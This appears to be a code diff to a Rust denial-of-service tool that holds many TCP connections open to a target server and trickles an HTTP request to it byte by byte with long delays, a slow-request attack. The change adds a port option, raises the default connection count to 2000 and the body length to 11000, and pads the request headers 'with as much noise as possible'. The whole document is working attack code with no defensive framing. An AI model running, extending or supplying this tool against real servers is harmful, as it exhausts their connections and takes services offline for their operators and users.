@@ -1,76 +1,21 @@
 use std::io::Write;
 use std::net::{IpAddr, TcpStream};
-use std::sync::Arc;
-use std::sync::atomic::{AtomicU64, Ordering};
+use std::sync::{Arc, Mutex};
 use std::thread::{sleep, spawn};
-use std::time::{Duration, Instant};
+use std::time::Duration as StdDuration;
 
+use chrono::Local;
 use console::Term;
 use ctrlc;
-use indicatif::{ProgressBar, ProgressStyle};
+use indicatif::{MultiProgress, ProgressBar, ProgressDrawTarget, ProgressStyle};
 use rand::{Rng, thread_rng};
 use rand::distributions::Alphanumeric;
-
-fn main() {
-    let args = parse_args();
-
-    let host = args.host;
-    let ip = args.ip;
-    let connections = args.connections;
-    let time_out_min = args.timeout_min;
-    let time_out_max = args.timeout_max;
-    let body_length_min = args.body_length_min;
-    let body_length_max = args.body_length_max;
-
-    let mut rng = thread_rng();
-    let thread_counter = Arc::new(AtomicU64::new(0));
-    let connection_counter = Arc::new(AtomicU64::new(0));
-    // (total_response_time, total_responses)
-    // total responses needs to be one to not divide by 0. This will average out over time
-    let response_time = Arc::new((AtomicU64::new(0), AtomicU64::new(1)));
-
-    let connection_bar = ProgressBar::new(connections)
-        .with_style(ProgressStyle::default_bar()
-            .template("Average response time: {msg} ms\nSending connections: {pos}/{len}\n{wide_bar}"));
-
-    Term::stdout().hide_cursor().unwrap_or_else(|_| println!("Could not hide cursor"));
-    Term::stdout().clear_screen().unwrap_or_else(|_| println!("\n\n"));
-
-    ctrlc::set_handler(|| std::process::exit(0))
-        .expect("Could not change ctrl-c behaviour");
-
-    loop {
-        let current_connections = connection_counter.load(Ordering::Relaxed);
-        let time: u64 = response_time.0.load(Ordering::Relaxed);
-        let responses: u64 = response_time.1.load(Ordering::Relaxed);
-        let average_response_time = (time/responses).to_string();
-        let current_threads = thread_counter.load(Ordering::Relaxed);
-
-        connection_bar.set_position(current_connections);
-        connection_bar.set_message(&average_response_time);
-
-        if current_threads < connections {
-            let thread_counter = Arc::clone(&thread_counter);
-            let connection_counter = Arc::clone(&connection_counter);
-            let average_time = Arc::clone(&response_time);
-
-            let time_out = rng.gen_range(time_out_min, time_out_max);
-            let body_length = rng.gen_range(body_length_min, body_length_max);
-            let host = host.clone();
-
-            thread_counter.fetch_add(1, Ordering::Relaxed);
-            spawn(move || {
-                new_socket(connection_counter, average_time, &host, ip, 443, time_out, body_length);
-                thread_counter.fetch_sub(1, Ordering::Relaxed);
-            });
-        }
-    }
-}
 
 struct Args {
     host: String,
     ip: IpAddr,
-    connections: u64,
+    port: u16,
+    max_connections: u64,
     timeout_min: u64,
     timeout_max: u64,
     body_length_min: usize,
@@ -78,6 +23,94 @@ struct Args {
 
 }
 
+struct Attrs {
+    total_requests: u64,
+    total_responses: u64,
+    total_response_time: u64,
+    current_connections: u64,
+    current_threads: u64,
+}
+
+impl Attrs {
+    pub fn new() -> Self {
+        Self {
+            total_requests: 0,
+            total_responses: 1, // is one to not divide by zero before the first request
+            total_response_time: 0,
+            current_connections: 0,
+            current_threads: 0,
+        }
+    }
+}
+
+fn main() {
+    // set the important application variables and states
+    let args = Arc::new(parse_args());
+    let attrs = Arc::new(Mutex::new(Attrs::new()));
+
+    // create a progress bar
+    // This progress bar show the user the currently sending connections in comparision to the maximum
+    // amount of connections
+    let progress_bars = MultiProgress::new();
+    progress_bars.set_draw_target(ProgressDrawTarget::stdout_with_hz(10));
+    let connection_bar = progress_bars.add(ProgressBar::new(args.max_connections)
+        .with_style(ProgressStyle::default_bar()
+            .template("Average response time: {msg} ms\n\nSending connections: {pos}/{len}\n{wide_bar}")));
+    let success_bar = progress_bars.add(ProgressBar::new(100)
+        .with_style(ProgressStyle::default_bar()
+            .template("successful requests: {pos}%\n{wide_bar}")));
+
+    // Hide the console cursor and clear the screen
+    Term::stdout().hide_cursor().unwrap_or_else(|_| {});
+    Term::stdout().clear_screen().unwrap_or_else(|_| println!("\n\n"));
+
+    // change the Ctrl+C behaviour to just exit the process
+    ctrlc::set_handler(|| std::process::exit(0))
+        .expect("Could not change ctrl-c behaviour");
+
+    // it's necessary to create a new thread so the progress-bars are displayed correctly
+    spawn(move || {
+        loop {
+            let average_response_time;
+            let successful_connects;
+            let current_threads;
+            let current_connections;
+            {
+                let attrs = attrs.lock().unwrap();
+                average_response_time = (attrs.total_response_time / attrs.total_responses).to_string();
+                successful_connects = ((attrs.total_responses as f64 / attrs.total_requests as f64) * 100.0) as u64;
+                current_connections = attrs.current_connections;
+                current_threads = attrs.current_threads;
+            }
+
+            // update the progress bar
+            connection_bar.set_position(current_connections);
+            connection_bar.set_message(&average_response_time);
+            success_bar.set_position(successful_connects);
+
+            // spawn a new thread if not enough connections exists
+            if current_threads < args.max_connections {
+                let args = Arc::clone(&args);
+                let attrs = Arc::clone(&attrs);
+                let port = args.port;
+
+                {
+                    let mut attrs = attrs.lock().unwrap();
+                    attrs.current_threads += 1;
+                    attrs.total_requests += 1;
+                }
+
+                spawn(move || {
+                    new_socket(args, attrs, port);
+                });
+            }
+        }
+    });
+
+    progress_bars.join().unwrap();
+}
+
+/// parses the arguments given to the application
 fn parse_args() -> Args {
     use dns_lookup::{lookup_host, lookup_addr};
     use clap::{App, Arg};
@@ -100,7 +133,7 @@ fn parse_args() -> Args {
             .short("c")
             .long("connections")
             .takes_value(true)
-            .default_value("1000")
+            .default_value("2000")
             .validator(|connections| {
                 if let Ok(_) = connections.parse::<u64>() { Ok(()) } else { Err("must be an unsigned integer".to_string()) }
             })
@@ -120,8 +153,18 @@ fn parse_args() -> Args {
             .short("b")
             .long("body_length")
             .takes_value(true)
-            .default_value("1100")
+            .default_value("11000")
             .validator(|length| validate_range(&length))
+        )
+        .arg(Arg::with_name("port")
+            .help("specifies the port to connect to")
+            .short("p")
+            .long("port")
+            .takes_value(true)
+            .default_value("443")
+            .validator(|port| {
+                if let Ok(_) = port.parse::<u16>() { Ok(()) } else { Err("must be an unsigned integer".to_string()) }
+            })
         )
         .get_matches();
 
@@ -142,7 +185,8 @@ fn parse_args() -> Args {
             }
         }
     }
-    let connections = matches.value_of("connections").unwrap().parse().unwrap();
+    let port = matches.value_of("port").unwrap().parse().unwrap();
+    let max_connections = matches.value_of("connections").unwrap().parse().unwrap();
     let (timeout_min, timeout_max) = parse_range(matches.value_of("timeout").unwrap()).unwrap();
     let body_length = parse_range(matches.value_of("body_length").unwrap()).unwrap();
     let (body_length_min, body_length_max) = (body_length.0 as usize, body_length.1 as usize);
@@ -151,7 +195,8 @@ fn parse_args() -> Args {
     Args {
         host,
         ip,
-        connections,
+        port,
+        max_connections,
         timeout_min,
         timeout_max,
         body_length_min,
@@ -159,6 +204,7 @@ fn parse_args() -> Args {
     }
 }
 
+/// takes a str and ties to parse it into a tuple of a start and an end value
 /// returns (<start_inclusive>, <end_exclusive>)
 fn parse_range(string: &str) -> Result<(u64, u64), ()> {
     use regex::Regex;
@@ -191,70 +237,102 @@ fn parse_range(string: &str) -> Result<(u64, u64), ()> {
     }
 }
 
-fn new_socket(counter: Arc<AtomicU64>, average_time: Arc<(AtomicU64, AtomicU64)>, host: &str, ip: IpAddr, port: u16, time_out: u64, body_length: usize) {
-    let start = Instant::now();
+/// Tries to create a new TCPStream connection to the attacked server
+/// If this succeeds a HTTP request is send byte by byte with a delay between
+fn new_socket(args: Arc<Args>, attrs: Arc<Mutex<Attrs>>, port: u16) {
+    let start = Local::now();
 
-    let mut connection = match TcpStream::connect((ip, port)) {
+    let mut connection = match TcpStream::connect((args.ip, port)) {
         Ok(connection) => {
-            let time = Instant::now().duration_since(start).as_millis() as u64;
+            let response_time = Local::now().signed_duration_since(start).num_milliseconds() as u64;
 
-            counter.fetch_add(1, Ordering::Relaxed);
-            average_time.0.fetch_add(time, Ordering::Relaxed);
-            average_time.1.fetch_add(1, Ordering::Relaxed);
+            let mut attrs = attrs.lock().unwrap();
+            attrs.current_connections += 1;
+            attrs.total_response_time += response_time;
+            attrs.total_responses += 1;
 
             connection
         }
         Err(_) => return
     };
 
-    let time_out = Duration::from_secs(time_out);
+    let time_out = thread_rng().gen_range(args.timeout_min, args.timeout_max);
+    let time_out = StdDuration::from_secs(time_out);
 
-    let request = http_request(host, body_length);
-    for c in request.as_bytes() {
-        match connection.write_all(&[*c]) {
-            Ok(_) => {}
-            Err(_) => {
-                counter.fetch_sub(1, Ordering::Relaxed);
-                return;
-            }
+    let body_length = thread_rng().gen_range(args.body_length_min, args.body_length_max);
+
+    let request = http_request(&args.host, body_length);
+
+    for byte in request.as_bytes() {
+        if let Err(_) = connection.write_all(&[*byte]) {
+            let mut attrs = attrs.lock().unwrap();
+            attrs.current_connections -= 1;
+            attrs.current_threads -= 1;
+
+            return;
         }
         sleep(time_out);
     }
-    counter.fetch_sub(1, Ordering::Relaxed);
+
+    let mut attrs = attrs.lock().unwrap();
+    attrs.current_connections -= 1;
+    attrs.current_threads -= 1;
 }
 
+/// creates a http request from a http header and a http body
 fn http_request(host: &str, body_length: usize) -> String {
-    format!("{}{}", http_header(host), http_body(body_length))
+    format!("{}{}", http_header(host, body_length), http_body(body_length))
 }
 
-fn http_header(host: &str) -> String {
+/// creates a valid HTTP header with as much noise as possible
+fn http_header(host: &str, content_length: usize) -> String {
     format!("\
     GET / HTTP/1.1\n\
     Host: {}\n\
-    Content-Type: application/x-www-form-urlencoded\n\
-    Accept: text/html,application/xhtml+xml,application/xml; q=0.9,image/webp,image/apng,*/*; q=0.8,application/signed-exchange; v=b3; q=0.9\n\
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*; q=0.8,application/signed-exchange; v=b3; q=0.9,*/*;q=0.8\n\
+    Accept-Charset: utf-8\n\
+    Accept-Encoding: gzip,deflate,br\n\
+    Accept-Language: en-US,en;q=0.9,en-UK;q=0.8,en;q=0.7,fr;q=0.6;de-DE\n\
+    Cache-Control: cache\n\
     Connection: keep-alive\n\
+    Content-Length: {}\n\
+    Content-Type: application/x-www-form-urlencoded\n\
+    Date: {}\n\
+    If-Match: \"737060cd8c284d8af7ad3082f209582d\"\n\
+    If-Modified-Since: Sat, 29 Oct 1994 19:43:31 GMT\n\
+    If-Unmodified-Since: {}\n\
+    Max-Forwards: 1000\n\
+    Pragma: cache\n\
+    Range: bytes=0-10\n\
+    TE: trailers, deflate\n\
     User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0\n\
-    Accept-Encoding: gzip, deflate, br\n\
-    Accept-Language: en-US,en;q=0.9,en-UK;q=0.8,en;q=0.7,fr;q=0.6\n\
-    ", host)
+    \n\
+    ", host, content_length, Local::now().format("%a, %d %b %Y %T %Z"), Local::now())
 }
 
+/// creates a application/x-www-form-urlencoded encoded body
 fn http_body(length: usize) -> String {
-    let lines = length / 11;
-    let rest = length % 11;
+    const LINE_LENGTH: usize = 11;
+
+    let lines = length / LINE_LENGTH;
+    let rest = length % LINE_LENGTH;
     let mut string = String::new();
 
     for _ in 0..lines {
-        string.push_str(&rand_string(5));
+        let first: usize = thread_rng().gen_range(1, LINE_LENGTH - 1);
+        let last = LINE_LENGTH - first - 1;
+
+        string.push_str(&rand_string(first));
         string.push('=');
-        string.push_str(&rand_string(5));
+        string.push_str(&rand_string(last));
     }
     string.push_str(&rand_string(rest));
 
     string
 }
 
+
+/// creates a random string
 fn rand_string(length: usize) -> String {
     thread_rng()
         .sample_iter(&Alphanumeric)
